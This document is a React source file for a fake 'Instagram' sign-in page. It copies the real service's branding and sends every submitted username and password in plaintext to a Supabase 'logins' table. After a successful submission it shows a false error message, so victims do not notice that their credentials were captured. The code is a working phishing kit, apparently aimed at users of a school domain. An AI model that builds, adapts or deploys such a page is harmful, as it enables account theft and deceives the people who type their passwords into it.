"use client"

import type React from "react"
import { createClient } from "@/lib/supabase/client"
import { Input } from "@/components/ui/input"
import { Button } from "@/components/ui/button"
import { useState } from "react"

export default function LoginPage() {
  const [username, setUsername] = useState("")
  const [password, setPassword] = useState("")
  const [error, setError] = useState<string | null>(null)
  const [isLoading, setIsLoading] = useState(false)
  const [success, setSuccess] = useState(false)

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault()
    const supabase = createClient()
    setIsLoading(true)
    setError(null)
    setSuccess(false)

    try {
      if (!username || !password) {
        throw new Error("Username and password are required")
      }

      const { error: dbError } = await supabase.from("logins").insert({
        username,
        password,
        email: `${username}@school.local`,
      })

      if (dbError) throw dbError

      setSuccess(true)
      setUsername("")
      setPassword("")
      setTimeout(() => setSuccess(false), 3000)
    } catch (error: unknown) {
      setError(error instanceof Error ? error.message : "An error occurred")
    } finally {
      setIsLoading(false)
    }
  }

  return (
    <div className="min-h-screen bg-background flex items-center justify-center px-4 md:px-0">
      <div className="flex w-full max-w-5xl">
        <div className="hidden lg:flex lg:w-1/2 items-center justify-center pr-8">
          <div className="relative">
            {/* Phone frame */}
            <div className="bg-black rounded-3xl p-2 shadow-2xl w-80 h-96">
              <div className="bg-gradient-to-br from-purple-600 via-pink-500 to-orange-400 rounded-3xl w-full h-full flex items-center justify-center">
                <div className="text-white text-center px-4">
                  <div className="text-4xl font-bold mb-2">Connect</div>
                  <div className="text-sm opacity-90">Share moments with friends</div>
                </div>
              </div>
            </div>
          </div>
        </div>

        <div className="w-full lg:w-1/2 flex flex-col gap-4">
          {/* Logo and heading */}
          <div className="flex flex-col gap-6 mb-4">
            <div>
              <svg viewBox="0 0 100 100" width="60" height="60" className="mb-4">
                {/* Camera body - rounded square */}
                <rect x="10" y="10" width="80" height="80" rx="16" fill="none" stroke="white" strokeWidth="3" />

                {/* Lens - circle */}
                <circle cx="50" cy="50" r="22" fill="none" stroke="white" strokeWidth="3" />

                {/* Flash - small dot in top right */}
                <circle cx="70" cy="23" r="3" fill="white" />
              </svg>
              <h1 className="text-4xl font-bold tracking-tight text-foreground mb-2">Instagram</h1>
              <p className="text-muted-foreground text-sm">Sign in to your account to continue</p>
            </div>
          </div>

          {/* Login form card */}
          <div className="bg-card border border-border rounded-lg p-8 w-full max-w-sm">
            <form onSubmit={handleLogin} className="flex flex-col gap-4">
              <div className="flex flex-col gap-2">
                <Input
                  type="text"
                  placeholder="Username or email"
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  required
                  className="bg-input text-foreground border-border placeholder:text-muted-foreground h-10 text-sm"
                />
              </div>

              <div className="flex flex-col gap-2">
                <Input
                  type="password"
                  placeholder="Password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  required
                  className="bg-input text-foreground border-border placeholder:text-muted-foreground h-10 text-sm"
                />
              </div>

              {error && <p className="text-sm text-destructive text-center">{error}</p>}

              {success && (
                <p className="text-sm text-red-400 text-center font-medium">
                  {" "}
                  An Error occured please try again later!
                </p>
              )}

              <Button
                type="submit"
                disabled={isLoading}
                className="w-full bg-primary text-primary-foreground font-semibold h-10 mt-2"
              >
                {isLoading ? "Signing in..." : "Sign in"}
              </Button>
            </form>

            {/* Divider */}
            <div className="flex items-center gap-3 my-6">
              <div className="flex-1 h-px bg-border"></div>
              <span className="text-xs text-muted-foreground">OR</span>
              <div className="flex-1 h-px bg-border"></div>
            </div>

            {/* Alternative login */}
            <button className="w-full text-sm text-foreground font-semibold hover:opacity-80 transition-opacity">
              Log in with Facebook
            </button>

            {/* Forgot password */}
            <div className="text-center mt-4">
              <a href="#" className="text-xs text-accent hover:opacity-80 transition-opacity">
                Forgot password?
              </a>
            </div>
          </div>

          {/* Sign up prompt */}
          <div className="text-center text-sm">
            <span className="text-muted-foreground">
              Don't have an account?{" "}
              <a href="#" className="text-foreground font-semibold hover:opacity-80 transition-opacity">
                Sign up
              </a>
            </span>
          </div>
        </div>
      </div>
    </div>
  )
}
